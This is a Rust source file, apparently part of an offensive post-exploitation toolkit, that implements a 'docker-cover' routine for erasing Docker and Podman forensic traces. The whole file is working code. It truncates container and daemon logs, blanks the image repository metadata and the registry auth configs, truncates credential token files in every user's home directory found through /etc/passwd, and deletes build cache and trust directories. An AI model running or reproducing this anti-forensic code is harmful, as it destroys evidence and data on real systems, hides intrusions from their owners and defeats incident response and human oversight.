// Wipe Docker forensic artifacts: container logs, daemon state, client credentials,
// build cache layer metadata, and container history.

use std::fs;
use std::path::{Path, PathBuf};

#[derive(Default)]
pub struct DockerCoverStats {
    pub logs_wiped:     u32,
    pub configs_wiped:  u32,
    pub dirs_removed:   u32,
    pub errors:         u32,
}

fn home_dirs() -> Vec<PathBuf> {
    let mut homes = Vec::new();
    if let Ok(c) = fs::read_to_string("/etc/passwd") {
        for line in c.lines() {
            let parts: Vec<&str> = line.split(':').collect();
            if parts.len() >= 6 {
                let p = PathBuf::from(parts[5]);
                if p.exists() && p != PathBuf::from("/") { homes.push(p); }
            }
        }
    }
    homes
}

fn truncate(p: &Path, s: &mut DockerCoverStats, verbose: bool) {
    match fs::OpenOptions::new().write(true).open(p) {
        Ok(f) => {
            let _ = f.set_len(0);
            s.logs_wiped += 1;
            if verbose { eprintln!("[+] docker-cover: truncated {:?}", p); }
        }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
        Err(e) => { s.errors += 1;
                    if verbose { eprintln!("[!] docker-cover: {:?}: {}", p, e); } }
    }
}

fn overwrite_json(p: &Path, content: &[u8], s: &mut DockerCoverStats, verbose: bool) {
    if !p.exists() { return; }
    match fs::write(p, content) {
        Ok(_)  => { s.configs_wiped += 1;
                    if verbose { eprintln!("[+] docker-cover: cleared {:?}", p); } }
        Err(e) => { s.errors += 1;
                    if verbose { eprintln!("[!] docker-cover: {:?}: {}", p, e); } }
    }
}

fn remove_dir(p: &Path, s: &mut DockerCoverStats, verbose: bool) {
    match fs::remove_dir_all(p) {
        Ok(_)  => { s.dirs_removed += 1;
                    if verbose { eprintln!("[+] docker-cover: removed {:?}", p); } }
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {}
        Err(e) => { s.errors += 1;
                    if verbose { eprintln!("[!] docker-cover: {:?}: {}", p, e); } }
    }
}

fn wipe_container_logs(base: &Path, s: &mut DockerCoverStats, verbose: bool) {
    let containers = base.join("containers");
    if !containers.exists() { return; }
    let Ok(dir) = fs::read_dir(&containers) else { return };
    for entry in dir.flatten() {
        let cdir = entry.path();
        if !cdir.is_dir() { continue; }
        // <container_id>-json.log  — the main structured log file
        if let Ok(inner) = fs::read_dir(&cdir) {
            for f in inner.flatten() {
                let name = f.file_name();
                let ns   = name.to_string_lossy().to_string();
                if ns.ends_with("-json.log") || ns.ends_with(".log") {
                    truncate(&f.path(), s, verbose);
                }
            }
        }
    }
}

fn wipe_image_metadata(base: &Path, s: &mut DockerCoverStats, verbose: bool) {
    // repositories.json tracks image name→ID mappings
    for driver in &["overlay2", "aufs", "devicemapper", "vfs", "btrfs"] {
        let p = base.join("image").join(driver).join("repositories.json");
        overwrite_json(&p, b"{\"Repositories\":{}}\n", s, verbose);
    }
}

fn wipe_build_cache(base: &Path, s: &mut DockerCoverStats, verbose: bool) {
    // Buildkit / legacy builder cache directories
    for cache_dir in &["buildkit", "tmp/buildkit"] {
        let p = base.join(cache_dir);
        if p.is_dir() { remove_dir(&p, s, verbose); }
    }
}

pub fn wipe_docker_artifacts(verbose: bool) -> DockerCoverStats {
    let mut s = DockerCoverStats::default();

    // ── System Docker state (/var/lib/docker) ─────────────────────────────────
    let docker_data = Path::new("/var/lib/docker");
    if docker_data.exists() {
        wipe_container_logs(docker_data, &mut s, verbose);
        wipe_image_metadata(docker_data, &mut s, verbose);
        wipe_build_cache(docker_data, &mut s, verbose);

        // Docker daemon event log (varies — also via journald)
        for p in &[
            Path::new("/var/log/docker.log"),
            Path::new("/var/log/docker/docker.log"),
        ] {
            truncate(p, &mut s, verbose);
        }
    }

    // ── Per-user Docker client config ──────────────────────────────────────────
    for home in home_dirs() {
        let docker_cfg = home.join(".docker");
        if !docker_cfg.exists() { continue; }

        // config.json holds auth tokens, credential helper config
        let config = docker_cfg.join("config.json");
        overwrite_json(&config, b"{\"auths\":{}}\n", &mut s, verbose);

        // Credential helper token caches
        for name in &[
            "credentials.json", ".credentials.json",
            "token", ".token",
        ] {
            let p = docker_cfg.join(name);
            if p.is_file() { truncate(&p, &mut s, verbose); }
        }

        // Cached pull / trust metadata
        let trust = docker_cfg.join("trust");
        if trust.is_dir() { remove_dir(&trust, &mut s, verbose); }
    }

    // ── Podman (rootless) ──────────────────────────────────────────────────────
    for home in home_dirs() {
        let podman_logs = home.join(".local/share/containers/storage/overlay-containers");
        if podman_logs.is_dir() {
            if let Ok(dir) = fs::read_dir(&podman_logs) {
                for entry in dir.flatten() {
                    let log = entry.path().join("userdata").join("ctr.log");
                    truncate(&log, &mut s, verbose);
                }
            }
        }
        let podman_cfg = home.join(".config/containers/auth.json");
        overwrite_json(&podman_cfg, b"{\"auths\":{}}\n", &mut s, verbose);
    }

    if verbose {
        eprintln!("[+] docker-cover: {} logs wiped, {} configs cleared, {} dirs removed, {} errors",
            s.logs_wiped, s.configs_wiped, s.dirs_removed, s.errors);
    }
    s
}
